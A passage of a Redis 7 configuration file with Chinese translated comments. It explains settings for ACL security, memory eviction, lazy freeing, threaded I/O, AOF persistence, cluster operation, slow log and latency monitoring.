replication”部分提供了这些信息，在其他工具中，Redis Sentinel可以使用这些信息来发现副本实例。另一个可用此信息的地方是主机的“ROLE”命令的输出。# 副本正常上报的列表IP地址和端口可以通过以下方式获取:#   IP: 通过检查副本用于连接主服务器的套接字的对端地址，可以自动检测该地址。#   Port: 该端口在复制握手期间由副本通信，并且通常是副本用来侦听连接的端口。## 然而，当使用端口转发或网络地址转换(NAT)时，副本实际上可能通过不同的IP和端口对可达。副本可以使用以下两个选项向其主服务器报告特定的IP和端口集，这样INFO和ROLE都将报告这些值。# 如果只需要覆盖端口或IP地址，则不需要同时使用这两个选项。## replica-announce-ip 5.5.5.5# replica-announce-port 1234
KEYS TRACKING
############################### KEYS TRACKING ################################## Redis实现了客户端值缓存的服务器辅助支持。# 这是使用一个invalidation table来实现的，它使用一个按键名索引的基数键来记住客户端有哪些键。# 反过来，这用于向客户端发送invalidation messages。请点击本页了解更多功能:#   https://redis.io/topics/client-side-caching## 当对客户端启用跟踪时，所有的只读查询都被假定为缓存:这将迫使Redis在invalidation table中存储信息。当KEY被修改时，此类信息将被清除，invalidation messages将被发送到客户端。# 然而，如果工作负载被读操作严重占据，Redis可能会使用越来越多的内存来跟踪多个客户端获取的键。# # 因此，可以为无效表配置一个最大填充值。默认情况下，它被设置为1M的键，一旦达到这个限制，Redis将开始从invalidation table中删除键，即使它们没有被修改，只是为了回收内存:这将反过来迫使客户端使缓存的值无效。# 基本上，表的最大大小是在服务器端用于跟踪谁缓存了什么信息的内存和客户端在内存中保留缓存对象的能力之间进行权衡。# # 如果将该值设置为0，则意味着没有限制，并且Redis将在无效表中保留尽可能多的键。# 在“stats” INFO部分中，您可以找到关于invalidation table中每个给定时刻的键数的信息。## Note: 当在广播模式下使用KEY跟踪时，服务器端不使用内存，因此此设置是无用的。## tracking-table-max-keys 1000000
SECURITY：安全配置
################################## SECURITY #################################### 在 Redis6.0中引入了ACL（Access Control List) 的支持，可以给每个用户分配不同的权限来控制权限。# Redis ACL用户的定义格式如下:#   user &lt;username&gt; ... acl rules ...## For example:#   user worker +@list +@connection ~jobs:* on &gt;ffa9203c493aa99## 新连接使用特殊用户名“default”。# 如果该用户具有“nopass”规则，那么新的连接将立即作为“默认”用户进行身份验证，而不需要通过AUTH命令提供任何密码。# 否则，如果“默认”用户没有标记为“nopass”，则连接将在未验证的状态下启动，并将需要AUTH(或HELLO命令AUTH选项)才能进行身份验证并开始工作。## 基本上ACL规则是从左到右处理的。## ACL日志# ACL日志跟踪与ACL相关的失败命令和认证事件。ACL日志用于排除被ACL阻塞的命令失败的故障。ACL日志存储在内存中。可以使用ACL LOG RESET回收内存。# 定义下面ACL日志的最大条目长度。acllog-max-len 128# 使用外部ACL文件# 不需要在此文件中配置用户，可以使用单独列出用户的文件。两种方法不能混合使用:# 如果在这里配置用户，同时激活外部ACL文件，服务器将拒绝启动。# 外部ACL用户文件的格式与redis.conf中用于描述用户的格式完全相同。## aclfile /etc/redis/users.acl# 重要提示: 从Redis 6开始，“requirepass” 只是一个新的ACL系统之上的兼容层。选项效果将只是为默认用户“default”设置密码。# 客户端仍然会像往常一样使用AUTH &lt;password&gt;进行身份验证，或者更明确地使用AUTH default &lt;password&gt;，如果他们遵循新协议:两者都可以工作。# requirepass与aclfile选项和ACL LOAD命令不兼容，这将导致requirepass被忽略。## requirepass foobared# 默认情况下，新用户初始化具有限制性权限，通过等价于ACL规则'off resetkeys -@all'。# 从Redis 6.2开始，也可以使用ACL规则管理对Pub/Sub通道的访问。默认的Pub/Sub通道权限如果新用户是由acl-pubsub-default配置指令控制的，该指令接受以下值之一:#  - allchannels: 允许访问所有的Pub/Sub频道#  - resetchannels: 撤销对所有发布/订阅频道的访问# 从Redis 7.0开始，acl-pubsub-default默认为'resetchannels'权限。## acl-pubsub-default resetchannels# 命令重命名(弃用)。# ------------------------------------------------------------------------# WARNING: 尽可能避免使用此选项。相反，使用acl从默认用户中删除命令，只将它们放在您为管理目的而创建的某个管理用户中。# ------------------------------------------------------------------------# 可以在共享环境中更改危险命令的名称。例如，CONFIG命令可能会被重命名为难以猜测的内容，以便它仍然对内部使用的工具可用，但对普通客户端不可用。# 举例：# rename-command CONFIG b840fc02d524045429941cc15f59e41cb7be6c52# 也可以通过将命令重命名为空字符串来完全终止命令:# rename-command CONFIG ""## 请注意，更改登录到AOF文件或传输到副本的命令的名称可能会导致问题。
CLIENT：客户端
################################### CLIENTS ##################################### 设置客户端同时最大连接数。#  默认情况下，这个限制被设置为10000个客户端，但是如果Redis服务器不能配置进程文件限制，以允许指定的限制，允许的最大客户端数量被设置为当前文件限制-32(因为Redis保留了一些文件描述符供内部使用)# 一旦达到限制，Redis将关闭所有的新连接，发送一个错误'max number of clients reached'.## 重要说明: 当使用Redis集群时，最大连接数也与集群总线共享:集群中的每个节点将使用两个连接，一个传入连接，另一个传出连接。在非常大的集群的情况下，相应地调整限制是很重要的。## maxclients 10000
MEMORY MANAGEMENT：内存管理
############################## MEMORY MANAGEMENT ################################# 将内存使用限制设置为指定的字节数。当达到内存限制时，Redis将尝试根据所选的清除策略(参见maxmemory-policy)删除键。# 如果Redis不能根据策略删除键，或者如果策略设置为'noeviction'， Redis将开始回复会使用更多内存的命令，如SET, LPUSH等，并将继续回复只读命令，如GET。# 当使用Redis作为LRU或LFU缓存，或为实例设置硬内存限制(使用'noeviction'策略)时，此选项通常很有用。## maxmemory &lt;bytes&gt;# MAXMEMORY策略:当达到MAXMEMORY时，Redis如何选择要删除的内容。您可以在以下行为中选择:## volatile-lru -&gt; 使用近似的LRU驱逐，仅具有过期时间的KEY# allkeys-lru -&gt; 使用近似的LRU驱逐任何键。# volatile-lfu -&gt; 使用近似LFU驱逐LFU, 仅具有过期时间的KEY# allkeys-lfu -&gt; 使用近似的LFU驱逐任何键# volatile-random -&gt; 删除具有过期时间设置的随机KEY# allkeys-random -&gt; 删除一个随机的任意KEY# volatile-ttl -&gt; 使用最近的过期时间(小TTL)删除KEY# noeviction -&gt; 不要清除任何东西，只是在写操作时返回一个错误。## LRU （Least Recently Used）：最近最少使用# LFU （Least Frequently Used）：最不经常使用的## LRU、LFU和volatile-ttl均采用近似随机化算法实现。## 注意:使用上述任何一种策略，当没有合适的键用于驱逐时，Redis将在需要更多内存的写操作时返回一个错误。# 这些命令通常用于创建新KEY、添加数据或修改现有KEY。例如:SET、INCR、HSET、LPUSH、SUNIONSTORE、SORT(由于STORE参数)和EXEC(如果事务包含任何需要内存的命令)。# 默认配置：## maxmemory-policy noeviction# LRU、LFU和最小TTL算法都不是精确算法，而是近似算法(为了节省内存)，因此您可以调整它的速度或精度。# 默认情况下，Redis将检查五个键，并选择一个最近使用最少的键，您可以使用以下配置指令更改样本大小。默认值5可以产生足够好的结果。10非常接近真实的LRU，但消耗更多的CPU。3更快，但不是很准确## maxmemory-samples 5# 驱逐处理被设计为在默认设置下正常工作。# 如果有一个异常大的写流量，这个值可能需要增加。降低这个值可能会降低延迟，但会影响清除处理的有效性#   0 = minimum latency, 10 = default, 100 = process without regard to latency## maxmemory-eviction-tenacity 10# 从Redis 5开始，默认情况下副本将忽略其maxmemory设置(除非在故障转移后或手动将其提升为主内存)。# 这意味着KEY的删除将仅由主服务器处理，将DEL命令发送到副本，作为主服务器中的KEY删除。# 这种行为可以确保主副本和副本保持一致，这通常是你想要的，但是如果你的副本是可写的，或者你想让副本有一个不同的内存设置，并且你确定对副本执行的所有写入都是幂等的，那么你可以改变这个默认值(但一定要理解你在做什么)。# 请注意，由于副本默认情况下不驱逐，因此它最终可能会使用比maxmemory设置的内存更多的内存(副本上的某些缓冲区可能更大，或者数据结构有时可能占用更多内存等等)。因此，请确保监视副本，并确保它们有足够的内存，在主服务器达到配置的maxmemory设置之前不会出现真正的内存不足情况。## replica-ignore-maxmemory yes# Redis以两种方式回收过期KEY:当这些KEY被发现过期时，在访问时，以及在后台，在所谓的“活动过期KEY”中回收。KEY空间被缓慢地交互式地扫描，寻找要回收的过期KEY，这样就有可能释放过期KEY的内存，并且在短时间内不会再次访问这些KEY。# 过期周期的默认工作将尽量避免在内存中保留超过10%的过期KEY，并尽量避免消耗总内存的25%以上，并增加系统的延迟。# 然而，可以将通常设置为“1”的过期“effort”增加到更大的值，直到值“10”。# 在其最大值时，系统将使用更多的CPU，更长的周期(技术上可能会引入更多的延迟)，并且系统中仍然存在的已经过期的KEY将更少。这是内存、CPU和延迟之间的权衡。## active-expire-effort 1
LAZY FREEING
############################# LAZY FREEING ##################################### Redis有两个删除键的原语。一个称为DEL，是对对象的阻塞删除。这意味着服务器停止处理新命令，以便以同步方式回收与对象关联的所有内存。# 如果删除的键与一个小对象相关联，执行DEL命令所需的时间非常小，与Redis中的大多数其他O(1)或O(log_N)命令相当。# 但是，如果键与包含数百万个元素的聚合值相关联，则服务器可能阻塞很长时间(甚至几秒钟)以完成操作。## 出于上述原因，Redis还提供了非阻塞删除原语，如UNLINK(非阻塞DEL)和FLUSHALL和FLUSHDB命令的ASYNC选项，以便在后台回收内存。这些命令在常数时间内执行。另一个线程将在后台以最快的速度递增地释放对象。## FLUSHALL和FLUSHDB的DEL、UNLINK和ASYNC选项由用户控制.# 什么时候使用一种或另一种是好主意，这取决于应用程序的设计。# 然而，Redis服务器有时不得不删除键或刷新整个数据库作为其他操作的副作用。# 具体来说，Redis在以下场景中独立于用户调用删除对象:## 1) 在清除时，由于maxmemory和maxmemory策略配置，为了为新数据腾出空间，不会超过指定的内存限制.# 2) 因为过期:当一个键具有相关的生存时间(参见expire命令)时，必须从内存中删除.# 3) 因为将数据存储在可能已经存在的键上的命令的副作用。     例如，RENAME命令，当它被另一个KEY替换时，可能会删除旧的KEY内容。类似地，带有STORE选项的SUNIONSTORE或SORT可以删除现有的键。     SET命令本身删除指定键的任何旧内容，以便用指定的字符串替换它.# 4) 在复制过程中，当一个副本与它的主数据库执行完全重新同步时，整个数据库的内容将被删除，以便加载刚刚传输的RDB文件## 在上述所有情况下，默认是以阻塞方式删除对象，就像调用DEL一样。但是，您可以使用以下配置指令专门配置每种情况，以便像调用UNLINK一样以非阻塞的方式释放内存lazyfree-lazy-eviction nolazyfree-lazy-expire nolazyfree-lazy-server-del noreplica-lazy-flush no# 当用户调用DEL代码替换为UNLINK调用是不容易的情况下，修改DEL命令的默认行为，完全像UNLINK，使用以下配置指令:lazyfree-lazy-user-del no# FLUSHDB, FLUSHALL, SCRIPT FLUSH and FUNCTION FLUSH 同时支持异步和同步删除, 可以通过将[SYNC|ASYNC]标志传递到命令中来控制。# 当两个标志都没有传递时，该指令将用于确定是否应该异步删除数据。lazyfree-lazy-user-flush no
THREADED I/O
################################ THREADED I/O ：慢I/O访问线程操作 ################################## Redis主要是单线程的，但是也有一些线程操作，如UNLINK，慢I/O访问和其他在边线程上执行的事情。## 现在也可以在不同的I/O线程中处理Redis客户端的套接字读写。# 由于写的很慢，通常Redis用户使用流水线来加快每个核的性能，并生成多个实例来扩展。使用I/O线程，可以轻松地将Redis加速两倍，而无需诉诸于流水线或实例分片。# 默认情况下线程是禁用的，我们建议只在至少有4个或更多内核的机器上启用它，至少留下一个备用内核。# 使用超过8个线程不太可能有太大帮助。我们也建议只有当你真的有性能问题时才使用线程I/O，因为Redis实例能够使用相当大比例的CPU时间，否则使用这个特性没有任何意义。## 例如，如果你有一个四核CPU，尝试使用2或3个I/O线程，如果你有一个8核，尝试使用6个线程。为了启用I/O线程，使用以下配置指令:## io-threads 4## 将io-threads设置为1将会像往常一样使用主线程。当I/O线程被启用时，我们只使用线程进行写操作，即执行write(2)系统调用并将客户端缓冲区传输到套接字。# 然而，也可以使用以下配置指令启用读取线程和协议解析，将其设置为yes:## io-threads-do-reads no## 通常，线程读取没有太大帮助。# NOTE 1: 这个配置指令不能在运行时通过CONFIG SET修改。此外，当启用SSL时，此特性目前无法工作。# NOTE 2:如果你想使用red -benchmark测试Redis的加速，确保你也在线程模式下运行基准测试本身，使用——threads选项来匹配Redis线程的数量，否则你将无法注意到这些改进。
KERNEL OOM CONTROL
############################ KERNEL OOM CONTROL：内核oom控制 ############################### 在Linux上，可以提示内核OOM杀手在内存不足时应该首先杀死哪些进程。# 启用这个特性可以使Redis主动控制所有进程的oom_score_adj值，这取决于它们的角色。# 默认分数将尝试在所有其他进程之前杀死后台子进程，并在主进程之前杀死副本。# Redis支持以下选项:# - no:       不要更改oom-score-adj(默认值)。# - yes:      “相对”的别名见下文。# - absolute: om-score-adj- Values中的值被写入内核。#- relative:  这些值在服务器启动时相对于oom_score_adj的初始值使用，然后被限制在-1000到1000的范围内。因为初始值通常为0，所以它们通常会与绝对值匹配。oom-score-adj no# 当使用oom-score-adj时，该指令控制主进程、副本进程和后台子进程的特定值。数值范围为-2000到2000(越高意味着越有可能被杀死)。# 没有特权的进程(不是根进程，并且没有CAP_SYS_RESOURCE功能)可以自由地增加其值，但不能将其降低到初始设置以下。# 这意味着将oom-score-adj设置为“相对”，并将oom-score-adj-values设置为正值总是会成功。oom-score-adj-values 0 200 800
KERNEL transparent hugepage CONTROL
#################### KERNEL transparent hugepage CONTROL ###################### # 通常内核的透明大页面控件设置为“madvise”或者默认为“never”(/sys/kernel/mm/transparent_hugepage/enabled)，这样，此配置无效。# 在将其设置为“always”的系统中，Redis将为了Redis进程尝试禁用它，为了避免延迟问题（特别是fork(2)和CoW的延迟问题）。# 如果出于某种原因，您更喜欢保持启用，您可以将此配置设置为“no”，并将内核全局设置为“always”。disable-thp yes
APPEND ONLY MODE：追加模式
############################## APPEND ONLY MODE ################################ 默认情况下，Redis会异步将数据集转储到磁盘上。这种模式在许多应用程序中已经足够好了，但是Redis进程的问题或停电可能会导致几分钟的写入丢失(取决于配置的保存点)。# 仅追加文件是另一种持久性模式，它提供了更好的持久性。# 例如，使用默认的数据fsync策略(参见后面的配置文件)，Redis可以在一个意外事件中丢失一秒钟的写操作内容（比如服务器断电，或者如果Redis进程本身发生了一些错误），但Reids程序仍然正常运行。# AOF和RDB持久性可以同时启用，没有任何问题.# 如果启动时启用AOF, Redis将加载AOF，这是具有更好的持久性保证的文件。## Please check https://redis.io/topics/persistence for more information.appendonly no# 仅附加文件的基本名称# Redis 7和更新版本使用一组只能追加的文件来持久化数据集和应用于它的更改。使用的文件有两种基本类型:# - 基本文件，它是表示创建文件时数据集完整状态的快照。 基本文件的形式可以是RDB (binary serialized：二进制序列化) or AOF (textual commands：文本命令).# - 增量文件，其中包含在前一个文件之后应用于数据集的其他命令。## 此外，清单文件用于跟踪文件及其创建和应用它们的顺序。# Append-only文件的文件名是由Redis按照特定的模式创建的。文件名的前缀基于“appendfilename”配置参数，后面跟着关于序列和类型的附加信息。# 例如，如果appendfilename设置为appendonly.aof，可以导出以下文件名:# - appendonly.aof.1.base.rdb （基本文件）# - appendonly.aof.1.incr.aof, appendonly.aof.2.incr.aof （增量文件）# - appendonly.aof.manifest （清单文件）appendfilename "appendonly.aof"# 为了方便起见，Redis将所有持久的仅追加文件存储在专用目录中。目录的名称由appenddirname配置参数决定。appenddirname "appendonlydir"# fsync()调用告诉操作系统实际将数据写入磁盘，而不是在输出缓冲区中等待更多数据。# 有些操作系统真的会在磁盘上刷新数据，其他操作系统会尽快尝试这样做。## Redis支持三种不同的模式:# - no: 不要fsync，让操作系统在需要的时候刷新数据。快。# - always: 每次写入仅追加日志后进行fsync。慢，但安全。# - everysec: 每秒只能进行一次fsync。妥协。## 默认是“everysec”，因为这通常是速度和数据安全之间的正确妥协。# 这取决于您是否可以将其放宽为“no”，从而让操作系统在需要时刷新输出缓冲区，以获得更好的性能(但如果您可以接受一些数据丢失的想法，请考虑默认的持久性模式快照)，或者相反，使用“always”，它非常慢，但比everysec更安全一些。具体内容参考： http://antirez.com/post/redis-persistence-demystified.html## 如果不确定选择哪种，使用默认的“everysec”。# appendfsync alwaysappendfsync everysec# appendfsync no# 当AOF的fsync策略设置为always或everysec时，一个后台保存进程(一个后台保存或AOF日志后台重写)正在对磁盘执行大量的I/O，在一些Linux配置中，Redis可能会在fsync()调用上阻塞太长时间。# 请注意，目前还没有修复这个问题，因为即使在不同的线程中执行fsync也会阻塞同步写(2)调用。## 为了缓解这个问题，可以使用以下选项来防止在BGSAVE或BGREWRITEAOF正在进行时在主进程中调用fsync()。# 这意味着当另一个子文件正在保存时，Redis的持久性与“appendfsync no”相同。# 实际上，这意味着在最坏的情况下(使用默认的Linux设置)，可能会丢失长达30秒的日志。## 如果你有延迟问题，把这个改为“是”。否则，从耐久性的角度来看，这是最安全的选择。no-appendfsync-on-rewrite no# 自动重写append only文件。# 当AOF日志大小增长到指定的百分比时，Redis能够隐式地自动重写日志文件，调用BGREWRITEAOF。# 它是这样工作的: Redis记住最近一次重写后AOF文件的大小(如果重启后没有发生重写，则使用启动时AOF的大小)。## 此基本大小与当前大小进行比较. 如果当前大小大于指定的百分比，则会触发重写. 此外，您还需要指定要重写的AOF文件的最小大小, 这对于避免重写AOF文件很有用，即使达到了百分比增长，但它仍然非常小。# 指定一个百分数为零以禁用自动AOF重写功能。auto-aof-rewrite-percentage 100auto-aof-rewrite-min-size 64mb# 在Redis启动过程中，当AOF数据被加载回内存时，可能会发现AOF文件在结束时被截断。当Redis运行的系统崩溃时，可能会发生这种情况, 特别是当ext4文件系统在没有data=ordered选项的情况下被挂载时(然而，当Redis本身崩溃或中止，但操作系统仍然正常工作时，这就不会发生)。# 当这种情况发生时，Redis可以退出错误，或者加载尽可能多的数据(现在的默认值)，并在发现AOF文件在结束时被截断时启动。以下选项控制此行为。## 如果aof-load-truncated设置为yes，则加载一个截断的AOF文件，并且Redis服务器开始发送日志来通知用户该事件。# 否则，如果该选项被设置为no，服务器将终止并报错并拒绝启动。当该选项设置为no时，用户需要在重新启动服务器之前使用“redis-check-aof”实用程序修复AOF文件。## 注意，如果AOF文件在中间被发现损坏，服务器仍然会报错退出。这个选项只适用于当Redis试图从AOF文件读取更多的数据，但没有足够的字节将被发现。aof-load-truncated yes# Redis可以创建RDB或AOF格式的只能追加的基本文件. 使用RDB格式总是更快更有效，仅出于向后兼容的目的才支持禁用RDB格式。aof-use-rdb-preamble yes# Redis支持在AOF中记录时间戳注释，以支持从特定时间点恢复数据。但是，使用此功能会以一种可能与现有AOF解析器不兼容的方式更改AOF格式。aof-timestamp-enabled no
SHUTDOWN
################################ SHUTDOWN ###################################### 关闭时等待副本的最大时间，以秒为单位。## 在关闭期间，宽限期允许任何滞后的副本在主复制存在之前赶上最新的复制偏移量。这段时间可以防止数据丢失，特别是对于没有配置磁盘备份的部署。# “shutdown-timeout”值是宽限期的持续时间，单位为秒。它只适用于实例有副本的情况。如果要禁用该特性，请将该值设置为0。## shutdown-timeout 10# 当Redis接收到SIGINT（中断信号：interrupt）或SIGTERM（终止信号：terminal）时，启动关机，默认情况下，如果配置了保存点，则在阻塞操作中将RDB快照写入磁盘。# 用于信号关闭的选项可以包括以下值:# default:  仅当配置保存点时保存RDB快照。等待滞后的副本赶上。# save:     强制数据库保存操作，即使没有配置保存点。# nosave:   拒绝数据库保存操作，即使配置了一个或多个保存点。# now:      跳过等待滞后的副本。# force:    忽略任何通常会阻止服务器退出的错误。## 只要“save”和“nosave”不同时设置，就允许任何值的组合。例如: "nosave force now"## shutdown-on-sigint default# shutdown-on-sigterm default
NON-DETERMINISTIC LONG BLOCKING COMMANDS
################ NON-DETERMINISTIC LONG BLOCKING COMMANDS： 不确定的长阻塞命令 ###################### 在Redis开始处理或拒绝其他客户端之前，EVAL脚本、函数和某些情况下模块命令的最大时间(以毫秒为单位)。## 如果达到最大执行时间，Redis将开始回复大多数命令与BUSY错误。# 在这种状态下，Redis只允许执行少量命令。例如，SCRIPT KILL, FUNCTION KILL, SHUTDOWN NOSAVE，可能还有一些模块特定的'allow-busy'命令。# SCRIPT KILL和FUNCTION KILL只能停止尚未调用任何写命令的脚本，因此，当用户不想等待脚本的自然终止时，如果脚本已经发出了写命令，则SHUTDOWN NOSAVE可能是停止服务器的唯一方法## 缺省值是5秒。可以将其设置为0或负值来禁用此机制(不间断执行)。注意，在过去这个配置有一个不同的名字，现在是一个别名，所以这两个都是一样的:## lua-time-limit 5000# busy-reply-threshold 5000
REDIS CLUSTER：集群配置
################################ REDIS CLUSTER  ################################ 普通的Redis实例不能成为Redis集群的一部分，只有作为集群节点启动的节点可以。# 为了启动一个Redis实例作为一个集群节点，启用集群支持取消注释如下:## cluster-enabled yes# 每个集群节点都有一个集群配置文件。此文件不建议手动编辑。它由Redis节点创建和更新。# 每个Redis集群节点都需要不同的集群配置文件。# 确保在同一系统中运行的实例没有重叠的集群配置文件名。## cluster-config-file nodes-6379.conf# 集群节点超时时间是指一个节点必须不可达的毫秒数，才会被认为处于故障状态。## cluster-node-timeout 15000# 集群端口是集群总线侦听入站连接的端口。# 当设置为默认值0时，绑定到命令端口+10000。设置此值要求您在执行cluster meet时指定集群总线端口。# cluster-port 0# 如果发生故障的主服务器的数据看起来太旧，它的副本将避免启动故障转移。# 对于副本来说，没有简单的方法可以准确测量其“数据年龄”，因此执行以下两个检查:## 1) 如果有多个副本能够进行故障转移，它们将交换消息，以便尝试为副本提供最佳复制偏移(处理来自主服务器的更多数据)。#     副本将尝试通过偏移量获得它们的排名，并将与它们的排名成比例的延迟应用于故障转移的开始。## 2) 每个副本都计算与主节点最后一次交互的时间. 这可能是接收到的最后一个ping或命令 (如果主服务器仍然处于“已连接”状态), 或者与主服务器断开连接后经过的时间(如果复制链路当前断开)。#     如果最后一次交互太旧，副本将根本不会尝试故障转移。## 第二点可由用户调整。具体来说，如果自上次与主服务器交互以来，所消耗的时间大于以下情况，副本将不执行故障转移:##   (node-timeout * cluster-replica-validity-factor) + repl-ping-replica-period#   (节点掉线时间 * 集群副本有效性因子) + 循环PING访问的周期时间## 因此，例如，如果node-timeout是30秒，cluster-replica-validity-factor是10，并且假设默认的repo -ping-replica-period是10秒，那么如果它不能与主服务器对话超过310秒，它就不会尝试故障转移。# 一个大的cluster-replica-validity-factor可能会允许带有太旧数据的副本故障转移到主节点，而一个太小的值可能会阻止集群完全能够选择一个副本。## 为了获得最大可用性，可以将cluster-replica-validity-factor设置为0，这意味着副本将始终尝试故障转移到主服务器，而不管它们最后一次与主服务器交互是什么时候。# (然而，他们总是尝试应用一个与他们的偏移等级成比例的延迟)。## 0是唯一能够保证当所有分区恢复时，集群始终能够继续运行的值。## cluster-replica-validity-factor 10# 集群副本能够迁移到孤立的主服务器，即没有工作副本的主服务器。# 这提高了集群抵抗故障的能力，否则，如果没有工作副本，孤立的主节点就不能在故障发生时被故障转移。但是，只有当它们的旧主人至少还有一定数量的其他工作副本时，副本才会迁移到孤立的主人。这个数字就是“迁移障碍”。迁移障碍为1意味着一个副本只有在它的主副本至少有一个其他工作副本时才会迁移，以此类推。它通常反映集群中每个主节点所需的副本数量。## 默认值是1(只有当它们的主副本保留至少一个副本时，副本才会迁移)。# 要禁用迁移，只需将其设置为一个非常大的值或将cluster-allow-replica-migration设置为“no”。可以设置0值，但仅在调试时有用，在生产中是危险的。## cluster-migration-barrier 1# 关闭此选项允许使用较少的自动集群配置。它既禁止迁移到孤儿的主节点，也禁止从空的主节点迁移。默认是'yes'(允许自动迁移)。## cluster-allow-replica-migration yes# 默认情况下，如果Redis集群节点检测到至少有一个哈希槽未被发现(没有可用的节点正在为它服务)，它们将停止接受查询。# 这样，如果集群部分关闭(例如，一系列哈希槽不再被覆盖)，所有集群最终都将不可用。一旦所有插槽被再次覆盖，它就自动返回可用。# 然而，有时您希望正在工作的集群子集继续接受对仍然覆盖的键空间部分的查询。为此，只需将cluster-require-full-coverage选项设置为no。## cluster-require-full-coverage yes# 当此选项设置为yes时，将防止副本在主服务器故障时试图将其主服务器故障转移。但是，如果强制执行，副本仍然可以执行手动故障转移。# 这在不同的场景中都很有用，特别是在多个数据中心操作的情况下，如果不是在DC完全故障的情况下，我们希望其中一方永远不会被提升。## cluster-replica-no-failover no# 当该选项设置为yes时，允许节点在集群处于down状态时服务读流量，只要节点认为它拥有插槽。# 这在两种情况下是有用的# 1. 当应用程序在节点故障或网络分区期间不需要数据一致性时。例如缓存数据。只要节点拥有数据，它就应该能够为其提供服务。# 2. 此用例用于集群不满足推荐的三个分片，但又希望启用集群模式并在以后扩展的配置。#    如果没有设置这个选项，1或2个分片配置中的主中断将导致整个集群的读/写中断，如果设置了这个选项，则只会导致写中断。如果没有指定的master，插槽的所有权将不会自动改变。# # cluster-allow-reads-when-down no# 当该选项设置为yes时，允许节点在集群处于down状态时服务发布分片流量，只要节点认为它拥有插槽。# 如果应用程序即使在集群全局稳定状态不正常的情况下也想使用pubsub特性，那么这是很有用的。如果应用程序想要确保只有一个分片服务于给定的通道，这个特性应该保持为yes。# # cluster-allow-pubsubshard-when-down yes# 设置每个集群总线连接的发送字节缓冲区的内存使用限制，超过限制缓冲区将被清空。# 这主要是为了防止发送缓冲区在通往慢速连接的链路上无限制地增长(例如PubSub消息被堆积起来)。默认情况下禁用此限制。# 而当INFO中的'mem_cluster_links' 和/或 'CLUSTER LINKS ' 命令回显中的'send-buffer-allocated'（已分配的发送缓冲区） 项不断增加时，启用该限制。# 建议设置1gb的最小限制，这样集群链接缓冲区默认情况下至少可以容纳一条PubSub消息。(client-query-buffer-limit默认值为1gb。见 ADVANCED CONFIG)## cluster-link-sendbuf-limit 0 # 集群可以使用此配置配置其宣布的主机名。# 对于需要使用TLS服务器名称指示(SNI)或处理基于DNS的路由的应用程序，这是一个常见的用例。# 默认情况下，该值仅在CLUSTER SLOTS命令中显示为额外的元数据，但可以使用'cluster-preferred-endpoint-type' 更改。该值通过集群总线传递给所有节点，将其设置为空字符串将删除主机名并传播删除。# cluster-announce-hostname ""# 集群可以通告客户端如何使用它们的IP地址连接到它们，用户定义主机名，或者声明它们没有端点。# 通过使用 cluster-preferred-end -type 配置值'ip'、'hostname'或'unknown-endpoint'来设置哪个端点显示为首选端点。# 这个值控制端点如何返回MOVED/ASKING请求以及CLUSTER插槽的第一个字段。# 如果首选端点类型设置为主机名，但没有设置宣布的主机名，则'?’将被返回。# 当集群宣称自己具有未知端点时，这表明服务器不知道客户机如何到达集群。这可能发生在某些网络情况下，其中有多个可能的路由到节点，并且服务器不知道客户端选择了哪一个。# 在这种情况下，服务器期望客户端通过发出最后一个请求时使用的相同端点进行联系，但是使用响应中提供的端口。## cluster-preferred-endpoint-type ip# In order to setup your cluster make sure to read the documentation# available at https://redis.io web site.
CLUSTER DOCKER/NAT support：集群配置
########################## CLUSTER DOCKER/NAT support：容器内集群配置  ######################### 在某些部署中，无法检测到Redis集群节点，因为地址是NAT-ted或因为端口被转发(典型的情况是Docker和其他容器)。# 为了使Redis集群在Docker容器这样的环境中工作，需要一个静态配置，其中每个节点都知道自己的公共地址。# 以下四个选项用于此范围，分别是:# * cluster-announce-ip# * cluster-announce-port# * cluster-announce-tls-port# * cluster-announce-bus-port# 每个配置都指示节点有关其地址、客户端端口(用于不带TLS和带TLS的连接)和集群消息总线端口。# 然后在总线包的报头中发布该信息，以便其他节点能够正确地映射发布该信息的节点的地址。# # 如果“tls-cluster”设置为“yes”，而“cluster-announce-tls-port”被省略或设置为“0”，则“cluster-announce-port”指的是TLS端口。# 另请注意，如果“tls-cluster”设置为“no“（默认），则”cluster-announce-tls-port”无效。## 如果不使用上述选项，将使用正常的Redis集群自动检测。# # 注意，在重新映射时，总线端口可能不在客户端端口+10000 的固定偏移量上，因此您可以根据重新映射的方式指定任何端口和总线端口。# 如果没有设置总线端口，将像往常一样使用固定偏移量10000## 例如:## cluster-announce-ip 10.1.1.5# cluster-announce-tls-port 6379# cluster-announce-port 0# cluster-announce-bus-port 6380
SLOW  LOG：慢查询日志
################################## SLOW LOG ：满查询日志#################################### Redis Slow Log 是一个记录超过指定执行时间的查询的系统。执行时间不包括I/O操作，如与客户端交谈、发送应答等，而只包括实际执行命令所需的时间(这是命令执行的唯一阶段，线程被阻塞，不能同时服务其他请求)。# 您可以使用两个参数配置慢速日志: 一个参数告诉Redis要超过多少微秒的执行时间才能记录命令，另一个参数是慢速日志的长度。# 当记录一个新命令时，最早的命令将从记录的命令队列中删除。# 下面的时间以微秒表示，因此1000000相当于一秒。请注意，负数禁用慢日志，而值为零则强制记录每个命令。slowlog-log-slower-than 10000# 这个长度没有限制。只是要注意它会消耗内存。# 可以使用SLOWLOG RESET回收慢日志使用的内存。slowlog-max-len 128
LATENCY MONITOR：延迟监控
################################ LATENCY MONITOR：延迟监控 ############################### The Redis latency monitoring subsystem samples different operations at runtime in order to collect data related to possible sources of latency of a Redis instance.# Redis延迟监控子系统在运行时对不同的操作进行抽样，以收集与Redis实例的可能延迟来源相关的数据。# 通过LATENCY命令，用户可以打印图表并获得报告。## 系统只记录执行时间等于或大于通过延迟监视器阈值配置指令指定的毫秒数的操作。# 当其值设置为0时，将关闭延迟监视器。## 默认情况下，延迟监视是禁用的，因为如果您没有延迟问题，则通常不需要它，并且收集数据会对性能产生影响，尽管影响很小，但可以在大负载下测量。# 如果需要，可以在运行时使用命令"CONFIG SET latency-monitor-threshold &lt;milliseconds&gt;" 轻松启用延迟监控。latency-monitor-threshold 0
LATENCY TRACKING：延迟追踪
################################ LATENCY TRACKING ############################### Redis扩展延迟监控跟踪每个命令的延迟，并通过“INFO latencystats”命令导出百分比分布，并通过LATENCY命令导出累积延迟分布(直方图)。# 默认情况下，扩展延迟监视是启用的，因为跟踪命令延迟的开销非常小。# latency-tracking yes# 缺省情况下，通过INFO latencystats命令导出的延迟百分比为p50、p99和p999。# latency-tracking-info-percentiles 50 99 99.9
EVENT NOTIFICATION：事件通知
